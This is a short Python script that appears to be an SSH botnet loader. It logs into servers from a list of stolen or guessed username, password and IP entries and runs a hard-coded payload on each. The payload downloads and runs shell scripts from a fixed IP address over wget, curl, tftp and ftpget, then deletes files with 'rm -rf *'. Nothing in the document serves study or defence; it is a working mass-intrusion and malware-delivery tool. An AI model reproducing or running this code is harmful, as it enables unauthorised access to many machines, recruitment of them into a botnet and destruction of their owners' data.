import sys
import paramiko
import threading


PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.201.28.102/jack5tr.sh; curl -O http://74.201.28.102/jack5tr.sh; chmod 777 jack5tr.sh; sh jack5tr.sh; tftp 74.201.28.102 -c get jack5tr.sh; chmod 777 jack5tr.sh; sh jack5tr.sh; tftp -r jack5tr2.sh -g 74.201.28.102; chmod 777 jack5tr2.sh; sh jack5tr2.sh; ftpget -v -u anonymous -p anonymous -P 21 74.201.28.102 jack5tr1.sh jack5tr1.sh; sh jack5tr1.sh; rm -rf jack5tr.sh jack5tr.sh jack5tr2.sh jack5tr1.sh; rm -rf *"

def load(username, password, ip):
    sshobj = paramiko.SSHClient()
    sshobj.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        sshobj.connect(ip, username=username, password=password, port=22, look_for_keys=True, timeout=10)
        print("\x1b[32m[+]\x1b[0;37m Logged In -> " + ip + " " + username + ":" + password + "")
    except Exception as e:
        # paramiko raises SSHException('No authentication methods available',) since we did not specify any auth methods. socket stays open.
        print("\x1b[31m[-]\x1b[0;37m " + ip + " " + username + ":" + password + " >> Exception: "+str(e))
        return
    stdin, stdout, stderr = sshobj.exec_command(PAYLOAD)
    print("\x1b[1;33m[?]\x1b[0;37m Server output: "+"".join(stdout.readlines()).strip())
if not len(sys.argv) > 1:
    print("\x1b[31m[-]\x1b[0;37m " + sys.argv[0] + " <file to load>")
    exit(-1)
with open(sys.argv[1], "r") as file:
    for server in file:
        splitted = server.split(":")
        threading.Thread(target=load, args=(splitted[0], splitted[1], splitted[2])).start()

